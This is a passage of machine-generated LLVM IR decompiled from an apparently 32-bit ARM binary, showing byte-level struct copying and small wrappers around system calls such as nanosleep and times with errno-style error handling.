  %v3_136b811 = udiv i32 %v1_136a8, 256
  %v1_136f0 = trunc i32 %v3_136b811 to i8
  %v3_136f0 = add i32 %v2_136f0, 17
  %v4_136f0 = inttoptr i32 %v3_136f0 to i8*
  store i8 %v1_136f0, i8* %v4_136f0, align 1
  %v0_136f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_136f4 = trunc i32 %v0_136f4 to i8
  %v2_136f4 = load i32, i32* @r5, align 4
  %v3_136f4 = add i32 %v2_136f4, 16
  %v4_136f4 = inttoptr i32 %v3_136f4 to i8*
  store i8 %v1_136f4, i8* %v4_136f4, align 1
  %v0_136f8 = load i32, i32* @r4, align 4
  %v1_136f8 = add i32 %v0_136f8, 8
  %v1_136fc = inttoptr i32 %v1_136f8 to i32*
  %v2_136fc = load i32, i32* %v1_136fc, align 4
  %v3_136fc = add i32 %v0_136f8, 12
  %v4_136fc = inttoptr i32 %v3_136fc to i32*
  %v5_136fc = load i32, i32* %v4_136fc, align 4
  store i32 %v5_136fc, i32* %r3.global-to-local, align 4
  %v1_13708 = inttoptr i32 %v0_136f8 to i32*
  %v2_13708 = load i32, i32* %v1_13708, align 4
  %v3_13708 = add i32 %v0_136f8, 4
  %v4_13708 = inttoptr i32 %v3_13708 to i32*
  %v5_13708 = load i32, i32* %v4_13708, align 4
  store i32 %v5_13708, i32* %r3.global-to-local, align 4
  %v0_1370c = load i32, i32* @r5, align 4
  %v1_1370c = inttoptr i32 %v0_1370c to i32*
  store i32 %v2_13708, i32* %v1_1370c, align 4
  %v3_1370c = add i32 %v0_1370c, 4
  %v4_1370c = inttoptr i32 %v3_1370c to i32*
  %v5_1370c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_1370c, i32* %v4_1370c, align 4
  %v0_13710 = load i32, i32* @r4, align 4
  %v1_13710 = add i32 %v0_13710, 8
  %v1_13714 = inttoptr i32 %v1_13710 to i32*
  %v2_13714 = load i32, i32* %v1_13714, align 4
  %v3_13714 = add i32 %v0_13710, 12
  %v4_13714 = inttoptr i32 %v3_13714 to i32*
  %v5_13714 = load i32, i32* %v4_13714, align 4
  store i32 %v5_13714, i32* %r3.global-to-local, align 4
  %v1_13718 = load i32, i32* @r5, align 4
  %v2_13718 = add i32 %v1_13718, 8
  %v3_13718 = inttoptr i32 %v2_13718 to i32*
  store i32 %v2_13714, i32* %v3_13718, align 4
  %v0_1371c = load i32, i32* %r3.global-to-local, align 4
  %v1_1371c = load i32, i32* @r5, align 4
  %v2_1371c = add i32 %v1_1371c, 12
  %v3_1371c = inttoptr i32 %v2_1371c to i32*
  store i32 %v0_1371c, i32* %v3_1371c, align 4
  %v0_13720 = load i32, i32* @r4, align 4
  %v1_13720 = add i32 %v0_13720, 18
  %v2_13720 = inttoptr i32 %v1_13720 to i8*
  %v3_13720 = load i8, i8* %v2_13720, align 1
  %v4_13720 = zext i8 %v3_13720 to i32
  store i32 %v4_13720, i32* %r3.global-to-local, align 4
  %v2_13724 = load i32, i32* @r5, align 4
  %v3_13724 = add i32 %v2_13724, 18
  %v4_13724 = inttoptr i32 %v3_13724 to i8*
  store i8 %v3_13720, i8* %v4_13724, align 1
  %v0_13728 = load i32, i32* @r4, align 4
  %v1_13728 = add i32 %v0_13728, 16
  %v2_13728 = inttoptr i32 %v1_13728 to i8*
  %v3_13728 = load i8, i8* %v2_13728, align 1
  %v4_13728 = zext i8 %v3_13728 to i32
  %v0_1372c = load i32, i32* %r7.global-to-local, align 4
  %v1_1372c = add i32 %v0_1372c, 1
  %v2_1372c = inttoptr i32 %v1_1372c to i8*
  %v3_1372c = load i8, i8* %v2_1372c, align 1
  %v4_1372c = zext i8 %v3_1372c to i32
  store i32 %v4_1372c, i32* %r3.global-to-local, align 4
  %v4_13730 = mul nuw nsw i32 %v4_1372c, 256
  %v5_13730 = or i32 %v4_13730, %v4_13728
  %v1_13734 = add nsw i32 %v5_13730, -19
  store i32 %v1_13734, i32* @r2, align 4
  %v3_13738 = call i32 @function_12110(i32 %v1_13760, i32 %v1_13764, i32 %v1_13734)
  %v0_1373c = load i32, i32* @r4, align 4
  %v1_1373c = add i32 %v0_1373c, 16
  %v2_1373c = inttoptr i32 %v1_1373c to i8*
  %v3_1373c = load i8, i8* %v2_1373c, align 1
  %v4_1373c = zext i8 %v3_1373c to i32
  store i32 %v4_1373c, i32* %r3.global-to-local, align 4
  %v0_13740 = load i32, i32* %r7.global-to-local, align 4
  %v1_13740 = add i32 %v0_13740, 1
  %v2_13740 = inttoptr i32 %v1_13740 to i8*
  %v3_13740 = load i8, i8* %v2_13740, align 1
  %v4_13740 = zext i8 %v3_13740 to i32
  %v4_13744 = mul nuw nsw i32 %v4_13740, 256
  %v5_13744 = or i32 %v4_13744, %v4_1373c
  store i32 %v5_13744, i32* %r3.global-to-local, align 4
  %v2_13748 = add i32 %v5_13744, %v0_1373c
  store i32 %v2_13748, i32* @r4, align 4
  %v0_1374c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1374c, i32* @r5, align 4
  %v1_13750.pre = load i32, i32* @r6, align 4
  %v0_13768.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13750

dec_label_pc_13750:                               ; preds = %dec_label_pc_13680, %dec_label_pc_136f0
  %stack_var_-52.0 = phi i32 [ -1, %dec_label_pc_13680 ], [ %v2_136fc, %dec_label_pc_136f0 ]
  %v0_13768 = phi i32 [ %v0_13688, %dec_label_pc_13680 ], [ %v0_13768.pre, %dec_label_pc_136f0 ]
  %v2_136f0 = phi i32 [ %v0_13688, %dec_label_pc_13680 ], [ %v0_1374c, %dec_label_pc_136f0 ]
  %v0_136a0 = phi i32 [ %v0_1368c, %dec_label_pc_13680 ], [ %v2_13748, %dec_label_pc_136f0 ]
  %v1_13750 = phi i32 [ %v5_1364c, %dec_label_pc_13680 ], [ %v1_13750.pre, %dec_label_pc_136f0 ]
  %stack_var_-48.0 = phi i32 [ -1, %dec_label_pc_13680 ], [ %v5_136fc, %dec_label_pc_136f0 ]
  %v0_13750 = load i32, i32* %sl.global-to-local, align 4
  %v2_13750 = add i32 %v0_13750, %v1_13750
  store i32 %v2_13750, i32* %r3.global-to-local, align 4
  %v3_13754 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_13754, i32* @r2, align 4
  %v3_13758 = icmp ult i32 %v0_136a0, %v2_13750
  %v1_1375c = add i32 %v0_136a0, 16
  store i32 %v1_1375c, i32* %r7.global-to-local, align 4
  %v1_13760 = add i32 %v2_136f0, 19
  store i32 %v1_13760, i32* @r0, align 4
  %v1_13764 = add i32 %v0_136a0, 19
  store i32 %v1_13764, i32* @r1, align 4
  br i1 %v3_13758, label %dec_label_pc_1369c, label %dec_label_pc_13770

dec_label_pc_13770:                               ; preds = %dec_label_pc_13750, %dec_label_pc_136c0
  %v1_13770 = phi i32 [ %v0_136d4, %dec_label_pc_136c0 ], [ %v2_136f0, %dec_label_pc_13750 ]
  %v0_13770 = phi i32 [ %v1_136d4, %dec_label_pc_136c0 ], [ %v0_13768, %dec_label_pc_13750 ]
  %v2_13770 = sub i32 %v1_13770, %v0_13770
  store i32 %v2_13770, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13774

dec_label_pc_13774:                               ; preds = %dec_label_pc_136dc, %dec_label_pc_13678, %dec_label_pc_13770
  %v0_13774 = phi i32 [ %v0_13774.pre, %dec_label_pc_136dc ], [ %v0_13678, %dec_label_pc_13678 ], [ %v2_13770, %dec_label_pc_13770 ]
  store i32 %v3_13620, i32* @r4, align 4
  store i32 %v9_13620, i32* %r6.global-to-local, align 4
  ret i32 %v0_13774

; uselistorder directives
  uselistorder i32 %v1_13764, { 1, 0 }
  uselistorder i32 %v1_13760, { 1, 0 }
  uselistorder i32 %v1_1375c, { 1, 0 }
  uselistorder i32 %v3_13754, { 1, 0 }
  uselistorder i32 %v0_136a0, { 2, 1, 3, 0 }
  uselistorder i32 %v2_136f0, { 0, 3, 1, 2 }
  uselistorder i32 %v0_136f8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13688, { 1, 0, 2 }
  uselistorder i32 %v5_1364c, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @function_12110, { 3, 1, 0, 2, 5, 4 }
  uselistorder i32 128, { 4, 5, 27, 6, 28, 18, 9, 10, 11, 12, 19, 0, 20, 13, 14, 15, 16, 17, 23, 1, 21, 2, 22, 3, 7, 24, 25, 26, 8 }
  uselistorder i32* @sp, { 4, 2, 1, 3, 0 }
  uselistorder i32* @r6, { 5, 151, 152, 153, 273, 274, 379, 380, 381, 382, 383, 384, 385, 387, 386, 402, 403, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 25, 26, 27, 28, 56, 97, 98, 99, 100, 47, 101, 102, 29, 103, 52, 104, 105, 106, 4, 3, 107, 108, 30, 31, 32, 33, 34, 48, 53, 16, 17, 18, 19, 20, 21, 22, 23, 24, 57, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 49, 50, 51, 58, 59, 60, 61, 54, 55, 109, 110, 111, 112, 113, 62, 63, 114, 115, 12, 116, 117, 118, 119, 120, 121, 122, 123, 124, 6, 131, 2, 132, 133, 1, 134, 135, 404, 405, 406, 277, 278, 279, 280, 0, 125, 126, 127, 128, 129, 130, 136, 137, 138, 139, 140, 141, 142, 7, 143, 144, 145, 146, 147, 14, 148, 149, 150, 172, 173, 174, 175, 13, 176, 177, 178, 8, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 281, 9, 282, 10, 283, 11, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 407, 408, 409, 410, 411, 412, 413, 414, 415, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 263, 266, 264, 265, 267, 268, 15, 269, 270, 271, 272, 275, 276 }
  uselistorder label %dec_label_pc_13774, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13750, { 1, 0 }
}

define i32 @function_13780() local_unnamed_addr {
dec_label_pc_13780:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13780 = load i32, i32* @r4, align 4
  store i32 %v3_13780, i32* %stack_var_-8, align 4
  %v0_13788 = load i32, i32* @r0, align 4
  store i32 %v0_13788, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13788, -4095
  br i1 %tmp, label %dec_label_pc_137a4, label %dec_label_pc_13794

dec_label_pc_13794:                               ; preds = %dec_label_pc_13780
  %v0_13794 = call i32 @function_120c4()
  %v0_13798 = load i32, i32* %r4.global-to-local, align 4
  %v1_13798 = sub i32 0, %v0_13798
  %v2_1379c = inttoptr i32 %v0_13794 to i32*
  store i32 %v1_13798, i32* %v2_1379c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_137a8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_137a4

dec_label_pc_137a4:                               ; preds = %dec_label_pc_13780, %dec_label_pc_13794
  %v2_137a8 = phi i32 [ %v3_13780, %dec_label_pc_13780 ], [ %v2_137a8.pre, %dec_label_pc_13794 ]
  %v0_137a4 = phi i32 [ %v0_13788, %dec_label_pc_13780 ], [ -1, %dec_label_pc_13794 ]
  store i32 %v2_137a8, i32* @r4, align 4
  ret i32 %v0_137a4

; uselistorder directives
  uselistorder i32 %v0_13788, { 1, 0, 2 }
  uselistorder label %dec_label_pc_137a4, { 1, 0 }
}

define i32 @function_137ac() local_unnamed_addr {
dec_label_pc_137ac:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_137ac = load i32, i32* @r4, align 4
  store i32 %v3_137ac, i32* %stack_var_-8, align 4
  %v0_137b4 = load i32, i32* @r0, align 4
  store i32 %v0_137b4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_137b4, -4095
  br i1 %tmp, label %dec_label_pc_137d0, label %dec_label_pc_137c0

dec_label_pc_137c0:                               ; preds = %dec_label_pc_137ac
  %v0_137c0 = call i32 @function_120c4()
  %v0_137c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_137c4 = sub i32 0, %v0_137c4
  %v2_137c8 = inttoptr i32 %v0_137c0 to i32*
  store i32 %v1_137c4, i32* %v2_137c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_137d4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_137d0

dec_label_pc_137d0:                               ; preds = %dec_label_pc_137ac, %dec_label_pc_137c0
  %v2_137d4 = phi i32 [ %v3_137ac, %dec_label_pc_137ac ], [ %v2_137d4.pre, %dec_label_pc_137c0 ]
  %v0_137d0 = phi i32 [ %v0_137b4, %dec_label_pc_137ac ], [ -1, %dec_label_pc_137c0 ]
  store i32 %v2_137d4, i32* @r4, align 4
  ret i32 %v0_137d0

; uselistorder directives
  uselistorder i32 %v0_137b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_137d0, { 1, 0 }
}

define i32 @function_137d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_137d8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_137d8 = load i32, i32* @r4, align 4
  store i32 %v3_137d8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_137fc, label %dec_label_pc_137ec

dec_label_pc_137ec:                               ; preds = %dec_label_pc_137d8
  %v0_137ec = call i32 @function_120c4()
  %v0_137f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_137f0 = sub i32 0, %v0_137f0
  %v2_137f4 = inttoptr i32 %v0_137ec to i32*
  store i32 %v1_137f0, i32* %v2_137f4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13800.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_137fc

dec_label_pc_137fc:                               ; preds = %dec_label_pc_137d8, %dec_label_pc_137ec
  %v2_13800 = phi i32 [ %v3_137d8, %dec_label_pc_137d8 ], [ %v2_13800.pre, %dec_label_pc_137ec ]
  %v0_137fc = phi i32 [ %arg1, %dec_label_pc_137d8 ], [ -1, %dec_label_pc_137ec ]
  store i32 %v2_13800, i32* %r4.global-to-local, align 4
  ret i32 %v0_137fc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_137fc, { 1, 0 }
}

define i32 @function_13804() local_unnamed_addr {
dec_label_pc_13804:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13804 = load i32, i32* @r4, align 4
  store i32 %v3_13804, i32* %stack_var_-8, align 4
  %v0_1380c = load i32, i32* @r0, align 4
  store i32 %v0_1380c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1380c, -4095
  br i1 %tmp, label %dec_label_pc_13828, label %dec_label_pc_13818

dec_label_pc_13818:                               ; preds = %dec_label_pc_13804
  %v0_13818 = call i32 @function_120c4()
  %v0_1381c = load i32, i32* %r4.global-to-local, align 4
  %v1_1381c = sub i32 0, %v0_1381c
  %v2_13820 = inttoptr i32 %v0_13818 to i32*
  store i32 %v1_1381c, i32* %v2_13820, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1382c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13828

dec_label_pc_13828:                               ; preds = %dec_label_pc_13804, %dec_label_pc_13818
  %v2_1382c = phi i32 [ %v3_13804, %dec_label_pc_13804 ], [ %v2_1382c.pre, %dec_label_pc_13818 ]
  %v0_13828 = phi i32 [ %v0_1380c, %dec_label_pc_13804 ], [ -1, %dec_label_pc_13818 ]
  store i32 %v2_1382c, i32* %r4.global-to-local, align 4
  ret i32 %v0_13828

; uselistorder directives
  uselistorder i32 %v0_1380c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13828, { 1, 0 }
}

define i32 @function_13830(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13830:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13874, label %dec_label_pc_13860

dec_label_pc_13860:                               ; preds = %dec_label_pc_13830
  %v0_13860 = call i32 @function_120c4()
  %v0_13864 = load i32, i32* %r4.global-to-local, align 4
  %v1_13864 = sub i32 0, %v0_13864
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1386c = inttoptr i32 %v0_13860 to i32*
  store i32 %v1_13864, i32* %v2_1386c, align 4
  %v0_1387c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1387c

dec_label_pc_13874:                               ; preds = %dec_label_pc_13830
  %v2_13874 = icmp eq i32 %arg1, 0
  br i1 %v2_13874, label %dec_label_pc_13888, label %dec_label_pc_1387c

dec_label_pc_1387c:                               ; preds = %dec_label_pc_13874, %dec_label_pc_13860
  %v0_1387c = phi i32 [ %arg1, %dec_label_pc_13874 ], [ %v0_1387c.pre, %dec_label_pc_13860 ]
  br label %dec_label_pc_1388c

dec_label_pc_13888:                               ; preds = %dec_label_pc_13874
  br label %dec_label_pc_1388c

dec_label_pc_1388c:                               ; preds = %dec_label_pc_1387c, %dec_label_pc_13888
  %v14_13890 = phi i32 [ %v0_1387c, %dec_label_pc_1387c ], [ %tmp9, %dec_label_pc_13888 ]
  ret i32 %v14_13890

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1388c, { 1, 0 }
}

define i32 @function_13894(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13894:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_13894 = load i32, i32* @r4, align 4
  store i32 %v3_13894, i32* %stack_var_-8, align 4
  %v6_13898 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_13898, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_13898, -4095
  br i1 %tmp6, label %dec_label_pc_138b8, label %dec_label_pc_138a8

dec_label_pc_138a8:                               ; preds = %dec_label_pc_13894
  %v0_138a8 = call i32 @function_120c4()
  %v0_138ac = load i32, i32* %r4.global-to-local, align 4
  %v1_138ac = sub i32 0, %v0_138ac
  %v2_138b0 = inttoptr i32 %v0_138a8 to i32*
  store i32 %v1_138ac, i32* %v2_138b0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_138b8

dec_label_pc_138b8:                               ; preds = %dec_label_pc_13894, %dec_label_pc_138a8
  %v0_138b8 = phi i32 [ %v6_13898, %dec_label_pc_13894 ], [ -1, %dec_label_pc_138a8 ]
  %v2_138bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_138bc, i32* %r4.global-to-local, align 4
  ret i32 %v0_138b8

; uselistorder directives
  uselistorder i32 %v6_13898, { 1, 0, 2 }
  uselistorder label %dec_label_pc_138b8, { 1, 0 }
}

define i32 @function_138c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_138c0:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_138c0 = load i32, i32* @r4, align 4
  store i32 %v3_138c0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_1cb18.473 to i32), i32* %r4.global-to-local, align 4
  %v2_138c8 = load i32, i32* @global_var_1cb18.473, align 4
  %v2_138cc = icmp eq i32 %v2_138c8, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_138cc, label %dec_label_pc_138dc, label %dec_label_pc_138e8

dec_label_pc_138dc:                               ; preds = %dec_label_pc_138c0
  %v2_138dc = call i32 @function_142d8(i32* null)
  %v1_138e0 = icmp slt i32 %v2_138dc, 0
  br i1 %v1_138e0, label %dec_label_pc_13908, label %dec_label_pc_138e8thread-pre-split

dec_label_pc_138e8thread-pre-split:               ; preds = %dec_label_pc_138dc
  %v0_138ec.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_138e8.pre = load i32, i32* @global_var_1cb18.473, align 4
  br label %dec_label_pc_138e8

dec_label_pc_138e8:                               ; preds = %dec_label_pc_138e8thread-pre-split, %dec_label_pc_138c0
  %v2_138e8 = phi i32 [ %v2_138e8.pre, %dec_label_pc_138e8thread-pre-split ], [ %v2_138c8, %dec_label_pc_138c0 ]
  %v1_138f4 = phi i32 [ %v0_138ec.pr, %dec_label_pc_138e8thread-pre-split ], [ %arg1, %dec_label_pc_138c0 ]
  %v2_138ec = icmp eq i32 %v1_138f4, 0
  store i32 %v2_138e8, i32* %r4.global-to-local, align 4
  br i1 %v2_138ec, label %dec_label_pc_1390c, label %dec_label_pc_138fc

dec_label_pc_138fc:                               ; preds = %dec_label_pc_138e8
  %v2_138f4 = add i32 %v1_138f4, %v2_138e8
  %v1_138fc = inttoptr i32 %v2_138f4 to i32*
  %v2_138fc = call i32 @function_142d8(i32* %v1_138fc)
  %v1_13900 = icmp slt i32 %v2_138fc, 0
  br i1 %v1_13900, label %dec_label_pc_13908, label %dec_label_pc_138fc.dec_label_pc_1390c_crit_edge

dec_label_pc_138fc.dec_label_pc_1390c_crit_edge:  ; preds = %dec_label_pc_138fc
  %v0_1390c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1390c

dec_label_pc_13908:                               ; preds = %dec_label_pc_138fc, %dec_label_pc_138dc
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1390c

dec_label_pc_1390c:                               ; preds = %dec_label_pc_138fc.dec_label_pc_1390c_crit_edge, %dec_label_pc_138e8, %dec_label_pc_13908
  %v0_1390c = phi i32 [ %v0_1390c.pre, %dec_label_pc_138fc.dec_label_pc_1390c_crit_edge ], [ %v2_138e8, %dec_label_pc_138e8 ], [ -1, %dec_label_pc_13908 ]
  %v2_13910 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13910, i32* @r4, align 4
  ret i32 %v0_1390c

; uselistorder directives
  uselistorder i32 %v2_138e8, { 1, 0, 2 }
  uselistorder i32* null, { 0, 4, 6, 24, 25, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 19, 2, 20, 3, 21, 22, 23 }
  uselistorder label %dec_label_pc_1390c, { 2, 0, 1 }
}

define i32 @function_13918(%tms* %arg1) local_unnamed_addr {
dec_label_pc_13918:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13918 = load i32, i32* @r4, align 4
  store i32 %v3_13918, i32* %stack_var_-8, align 4
  %v3_1391c = call i32 @times(%tms* %arg1)
  store i32 %v3_1391c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_1391c, -4095
  br i1 %tmp, label %dec_label_pc_1393c, label %dec_label_pc_1392c

dec_label_pc_1392c:                               ; preds = %dec_label_pc_13918
  %v0_1392c = call i32 @function_120c4()
  %v0_13930 = load i32, i32* %r4.global-to-local, align 4
  %v1_13930 = sub i32 0, %v0_13930
  %v2_13934 = inttoptr i32 %v0_1392c to i32*
  store i32 %v1_13930, i32* %v2_13934, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1393c

dec_label_pc_1393c:                               ; preds = %dec_label_pc_13918, %dec_label_pc_1392c
  %v0_1393c = phi i32 [ %v3_1391c, %dec_label_pc_13918 ], [ -1, %dec_label_pc_1392c ]
  %v2_13940 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13940, i32* %r4.global-to-local, align 4
  ret i32 %v0_1393c

; uselistorder directives
  uselistorder i32 %v3_1391c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1393c, { 1, 0 }
}

define i32 @function_13944(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13944:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 96, i32* @r2, align 4
  %v2_13960 = inttoptr i32 %arg2 to i8*
  %v3_13960 = call i32 @function_12130(i8* %v2_13960, i32 0)
  %v1_13964 = add i32 %tmp, 1
  %v2_13964 = inttoptr i32 %v1_13964 to i8*
  %v3_13964 = load i8, i8* %v2_13964, align 1
  %v4_13964 = zext i8 %v3_13964 to i32
  %v1_13968 = add i32 %tmp, 5
  %v2_13968 = inttoptr i32 %v1_13968 to i8*
  %v3_13968 = load i8, i8* %v2_13968, align 1
  %v4_13968 = zext i8 %v3_13968 to i32
  %v2_1396c = load i8, i8* %arg1, align 1
  %v3_1396c = zext i8 %v2_1396c to i32
  %v1_13970 = add i32 %tmp, 4
  %v2_13970 = inttoptr i32 %v1_13970 to i8*
  %v3_13970 = load i8, i8* %v2_13970, align 1
  %v4_13970 = zext i8 %v3_13970 to i32
  %v1_13974 = add i32 %tmp, 2
  %v2_13974 = inttoptr i32 %v1_13974 to i8*
  %v3_13974 = load i8, i8* %v2_13974, align 1
  %v4_13974 = zext i8 %v3_13974 to i32
  %v1_13978 = add i32 %tmp, 6
  %v2_13978 = inttoptr i32 %v1_13978 to i8*
  %v3_13978 = load i8, i8* %v2_13978, align 1
  %v4_13978 = zext i8 %v3_13978 to i32
  %v1_1397c = add i32 %tmp, 3
  %v2_1397c = inttoptr i32 %v1_1397c to i8*
  %v3_1397c = load i8, i8* %v2_1397c, align 1
  %v4_1397c = zext i8 %v3_1397c to i32
  %v4_13980 = mul nuw nsw i32 %v4_13964, 256
  %v5_13980 = or i32 %v3_1396c, %v4_13980
  %v4_13984 = mul nuw nsw i32 %v4_13968, 256
  %v5_13984 = or i32 %v4_13970, %v4_13984
  %v1_13988 = add i32 %tmp, 7
  %v2_13988 = inttoptr i32 %v1_13988 to i8*
  %v3_13988 = load i8, i8* %v2_13988, align 1
  %v4_13988 = zext i8 %v3_13988 to i32
  %v4_1398c = mul nuw nsw i32 %v4_13974, 65536
  %v5_1398c = or i32 %v4_1398c, %v5_13980
  %v4_13990 = mul nuw nsw i32 %v4_13978, 65536
  %v5_13990 = or i32 %v4_13990, %v5_13984
  %v4_13994 = mul nuw i32 %v4_1397c, 16777216
  %v5_13994 = or i32 %v4_13994, %v5_1398c
  %v4_13998 = mul nuw i32 %v4_13988, 16777216
  %v5_13998 = or i32 %v4_13998, %v5_13990
  store i32 %v5_13998, i32* %r3.global-to-local, align 4
  %v0_1399c = load i32, i32* %r7.global-to-local, align 4
  %v1_1399c = inttoptr i32 %v0_1399c to i32*
  store i32 %v5_13994, i32* %v1_1399c, align 4
  %v3_1399c = add i32 %v0_1399c, 4
  %v4_1399c = inttoptr i32 %v3_1399c to i32*
  %v5_1399c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_1399c, i32* %v4_1399c, align 4
  %v0_139a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_139a0 = add i32 %v0_139a0, 89
  %v2_139a0 = inttoptr i32 %v1_139a0 to i8*
  %v3_139a0 = load i8, i8* %v2_139a0, align 1
  %v4_139a0 = zext i8 %v3_139a0 to i32
  %v1_139a4 = add i32 %v0_139a0, 93
  %v2_139a4 = inttoptr i32 %v1_139a4 to i8*
  %v3_139a4 = load i8, i8* %v2_139a4, align 1
  %v4_139a4 = zext i8 %v3_139a4 to i32
  %v1_139a8 = add i32 %v0_139a0, 88
  %v2_139a8 = inttoptr i32 %v1_139a8 to i8*
  %v3_139a8 = load i8, i8* %v2_139a8, align 1
  %v4_139a8 = zext i8 %v3_139a8 to i32
  %v1_139ac = add i32 %v0_139a0, 92
  %v2_139ac = inttoptr i32 %v1_139ac to i8*
  %v3_139ac = load i8, i8* %v2_139ac, align 1
  %v4_139ac = zext i8 %v3_139ac to i32
  store i32 %v4_139ac, i32* %r3.global-to-local, align 4
  %v1_139b0 = add i32 %v0_139a0, 94
  %v2_139b0 = inttoptr i32 %v1_139b0 to i8*
